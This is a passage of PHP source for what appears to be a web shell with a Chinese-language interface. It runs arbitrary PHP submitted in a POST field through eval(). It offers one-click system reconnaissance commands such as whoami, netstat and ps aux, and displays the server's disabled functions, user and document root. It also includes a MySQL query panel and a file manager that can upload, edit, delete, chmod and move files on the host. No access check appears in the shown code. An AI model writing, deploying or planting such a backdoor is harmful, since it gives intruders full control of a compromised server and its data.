    </datalist>
  </form>
  <div class="row" style="margin-top:10px">
    <?php foreach (array('whoami', 'id', 'pwd', 'ls -la', 'dir', 'ipconfig', 'ifconfig', 'netstat -an', 'ps aux', 'tasklist') as $quick): ?>
      <a class="btn ghost" href="?a=cmd&d=<?php echo urlencode($dir); ?>"><?php echo h($quick); ?></a>
    <?php endforeach; ?>
  </div>
</div>
<div class="panel">
  <div class="panel-t">PHP 代码执行（POST code）</div>
  <form method="post" action="?a=phpcode&d=<?php echo urlencode($dir); ?>">
    <textarea class="code" style="min-height:120px" name="code"><?php echo "echo PHP_VERSION;\necho \"\\n\";\necho getcwd();"; ?></textarea>
    <div class="row" style="margin-top:10px"><button class="btn primary" type="submit">执行</button></div>
  </form>
</div>
<div class="panel">
  <div class="panel-t">常用信息</div>
  <div class="grid2">
    <div class="muted">系统：<?php echo h(PHP_OS); ?> / <?php echo h(@php_uname('s') . ' ' . @php_uname('r')); ?></div>
    <div class="muted">用户：<?php echo h(@get_current_user()); ?></div>
    <div class="muted">禁函数：<?php echo h(ini_get('disable_functions') ? ini_get('disable_functions') : '无'); ?></div>
    <div class="muted">SAPI：<?php echo h(PHP_SAPI); ?></div>
    <div class="muted">磁盘：<?php echo h(implode('  ', drives())); ?></div>
    <div class="muted">根目录：<?php echo h(isset($_SERVER['DOCUMENT_ROOT']) ? $_SERVER['DOCUMENT_ROOT'] : ''); ?></div>
  </div>
</div>
    <?php
    echo pageFoot();
    exit;
}

/* PHP 代码执行 */
if ($act === 'phpcode') {
    $code = post('code');
    $out = '';
    if ($code !== '') {
        @ob_start();
        try {
            eval($code);
        } catch (Throwable $e) {
            echo "\n[Error] " . $e->getMessage();
        }
        $out = (string)@ob_get_clean();
        if (!isset($_SESSION['cmdhist']) || !is_array($_SESSION['cmdhist'])) {
            $_SESSION['cmdhist'] = array();
        }
        $_SESSION['cmdhist'][] = substr($code, 0, 60);
    }
    echo pageHead('代码执行', $dir);
    echo '<div class="panel"><div class="panel-t">输出</div><pre class="term">' . h($out) . '</pre></div>';
    echo '<div class="panel"><form method="post" action="?a=phpcode&d=' . urlencode($dir) . '">'
        . '<textarea class="code" style="min-height:120px" name="code">' . h($code) . '</textarea>'
        . '<div class="row" style="margin-top:10px"><button class="btn primary" type="submit">再执行</button></div></form></div>';
    echo pageFoot();
    exit;
}

/* 数据库页 */
if ($act === 'db') {
    echo pageHead('数据库', $dir);
    ?>
<div class="panel">
  <div class="panel-t">MySQL 连接与查询</div>
  <form method="post" action="?a=db&d=<?php echo urlencode($dir); ?>">
    <div class="row" style="margin-bottom:10px">
      <input class="inp" name="host" value="127.0.0.1" placeholder="host">
      <input class="inp" name="port" value="3306" style="width:90px" placeholder="port">
      <input class="inp" name="user" placeholder="user">
      <input class="inp" name="pass" type="password" placeholder="password">
      <input class="inp grow" name="query" placeholder="SHOW DATABASES;">
    </div>
    <div class="row" style="margin-bottom:10px">
      <textarea class="code" style="min-height:120px" name="sql">SHOW DATABASES;</textarea>
    </div>
    <button class="btn primary" type="submit">查询</button>
  </form>
</div>
    <?php
    echo pageFoot();
    exit;
}

/* 默认：文件列表 */
echo pageHead($dir, $dir);
$list = listDir($dir);
$q = get('q');
$sort = get('sort', 'name');
$order = get('order', 'asc');
$flip = $order === 'asc' ? 'desc' : 'asc';
$permInfo = array();
?>
<div class="panel">
  <form class="row" method="get">
    <input type="hidden" name="a" value="list">
    <input class="inp grow" type="text" name="q" value="<?php echo h($q); ?>" placeholder="搜索当前目录文件名…">
    <button class="btn primary" type="submit">搜索</button>
    <a class="btn" href="?a=list&d=<?php echo urlencode($dir); ?>">清空</a>
  </form>
</div>

<form method="post" id="ff" action="?a=del&d=<?php echo urlencode($dir); ?>">
<input type="hidden" name="d" value="<?php echo h($dir); ?>">
<input type="hidden" name="single" id="single" value="">
<div class="panel">
  <div class="row" style="justify-content:space-between;margin-bottom:10px">
    <div class="panel-t" style="margin:0"><?php echo count($list); ?> 项 · <?php echo h($dir); ?></div>
    <div class="row">
      <button class="btn" type="button" onclick="ask('mkdir')">新建目录</button>
      <button class="btn" type="button" onclick="ask('mkfile')">新建文件</button>
      <button class="btn danger" type="button" onclick="bulk('del','删除选中的项目？')">删除选中</button>
      <button class="btn" type="button" onclick="bulk('zip','把选中项打包成 zip？')">打包选中</button>
      <button class="btn" type="button" onclick="bulk('copy','复制到哪个目录？')">复制选中</button>
      <button class="btn" type="button" onclick="bulk('move','移动到哪个目录？')">移动选中</button>
      <button class="btn ghost" type="button" onclick="invertSel()">反选</button>
    </div>
  </div>

  <table class="tbl">
    <thead>
      <tr>
        <th style="width:28px"><input type="checkbox" onclick="selAll(this)"></th>
        <th><a href="?a=list&d=<?php echo urlencode($dir); ?>&sort=name&order=<?php echo $flip; ?>&q=<?php echo urlencode($q); ?>">名称</a></th>
        <th style="width:100px"><a href="?a=list&d=<?php echo urlencode($dir); ?>&sort=size&order=<?php echo $flip; ?>&q=<?php echo urlencode($q); ?>">大小</a></th>
        <th style="width:80px">权限</th>
        <th style="width:150px"><a href="?a=list&d=<?php echo urlencode($dir); ?>&sort=time&order=<?php echo $flip; ?>&q=<?php echo urlencode($q); ?>">修改时间</a></th>
        <th style="width:260px">操作</th>
      </tr>
    </thead>
    <tbody>
<?php $i = 0; foreach ($list as $it): $e = $it['ext']; ?>
      <tr>
        <td><input class="chk" type="checkbox" name="sel[]" data-i="<?php echo $i; ?>" value="<?php echo h($it['path']); ?>"></td>
        <td class="name">
          <?php
            $ico = $it['dir'] ? '📁' : (in_array($e, array('php', 'phtml', 'php3', 'php5')) ? '🐘' : (in_array($e, array('jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg')) ? '🖼️' : (in_array($e, array('zip', 'rar', '7z', 'tar', 'gz')) ? '📦' : (in_array($e, array('txt', 'md', 'log', 'ini', 'conf', 'json', 'xml')) ? '📄' : '📃'))));
            echo '<span class="ico">' . $ico . '</span>';
            $url = $it['dir'] ? '?a=list&d=' . urlencode($it['path']) : '?a=edit&d=' . urlencode($dir) . '&f=' . urlencode($it['path']);
            echo '<a href="' . $url . '">' . h($it['name']) . '</a>';
            if ($it['link']) {
                echo '<span class="tag">link</span>';
            }
            if ($it['dir'] && @count(@scandir($it['path'])) > 0) {
                echo '<span class="muted"> </span>';
            }
          ?>
        </td>
        <td class="sz"><?php echo $it['dir'] ? '—' : humanSize($it['size']); ?></td>
        <td class="sz">
          <?php
            $p = $it['perm'];
            $sp = '';
            foreach (str_split($p) as $idx => $ch) {
                if ($idx >= 1 && $idx <= 3) {
                    $sp .= '<span class="perm-r">' . $ch . '</span>';
                } elseif ($idx >= 4 && $idx <= 6) {
                    $sp .= '<span class="perm-w">' . $ch . '</span>';
                } else {
                    $sp .= $ch;
                }
            }
            echo $sp;
          ?>
        </td>
        <td class="sz"><?php echo $it['mtime'] ? h(date('Y-m-d H:i', $it['mtime'])) : '—'; ?></td>
        <td>
          <?php if (!$it['dir']): ?>
            <a class="btn ghost" href="?a=edit&d=<?php echo urlencode($dir); ?>&f=<?php echo urlencode($it['path']); ?>">编辑</a>
            <a class="btn ghost" href="?a=download&f=<?php echo urlencode($it['path']); ?>">下载</a>
          <?php endif; ?>
          <button class="btn ghost" type="button" onclick="rowAct('rename',<?php echo $i; ?>,'<?php echo addslashes(h($it['name'])); ?>')">改名</button>
          <button class="btn ghost" type="button" onclick="rowAct('chmod',<?php echo $i; ?>,'<?php echo $it['perm']; ?>')">权限</button>
          <button class="btn danger" type="button" onclick="rowDel(<?php echo $i; ?>,'<?php echo addslashes(h($it['name'])); ?>')">删</button>
        </td>
      </tr>
<?php $i++; endforeach; ?>
<?php if (count($list) === 0): ?>
      <tr><td colspan="6" class="muted" style="text-align:center;padding:30px">空目录或没有匹配项</td></tr>
<?php endif; ?>
    </tbody>
  </table>
</div>
</form>

<?php if ($q === ''): ?>
<div class="panel">
  <div class="panel-t">拖拽上传 / 快速上传</div>
  <form method="post" action="?a=upload&d=<?php echo urlencode($dir); ?>" enctype="multipart/form-data">
    <div class="row"><input class="inp grow" type="file" name="f[]" multiple>
    <button class="btn primary" type="submit">上传</button>
    <a class="btn" href="?a=uploadform&d=<?php echo urlencode($dir); ?>">更多</a></div>
  </form>
</div>
<?php endif; ?>

<div class="panel">
  <div class="panel-t">跳转 / 历史</div>
  <form class="row" method="get">
    <input type="hidden" name="a" value="list">
    <input class="inp grow" type="text" name="d" value="<?php echo h($dir); ?>" placeholder="C:\ 或 /var/www 或 ~">
    <button class="btn primary" type="submit">跳转</button>
  </form>
  <div class="row" style="margin-top:10px">
    <?php if (!empty($_SESSION['hist'])): foreach ((array)$_SESSION['hist'] as $hh): ?>
      <a class="btn ghost" href="?a=list&d=<?php echo urlencode($hh); ?>"><?php echo h(strlen($hh) > 28 ? '…' . substr($hh, -26) : $hh); ?></a>
    <?php endforeach; endif; ?>
    <span class="muted">共 <?php echo count((array)(isset($_SESSION['hist']) ? $_SESSION['hist'] : array())); ?> 条记录</span>
  </div>
</div>

<div class="panel">
  <div class="panel-t">磁盘 / 环境</div>
  <div class="grid2">
    <div class="muted">当前目录：<?php echo h($dir); ?></div>
    <div class="muted">可写：<?php echo @is_writable($dir) ? '<span class="perm-r">是</span>' : '<span style="color:var(--danger)">否</span>'; ?></div>
    <div class="muted">剩余空间：<?php echo h(humanSize(@disk_free_space($dir))); ?> / 总 <?php echo h(humanSize(@disk_total_space($dir))); ?></div>
    <div class="muted">系统：<?php echo h(@php_uname()); ?></div>
  </div>
</div>
<?php
echo pageFoot();
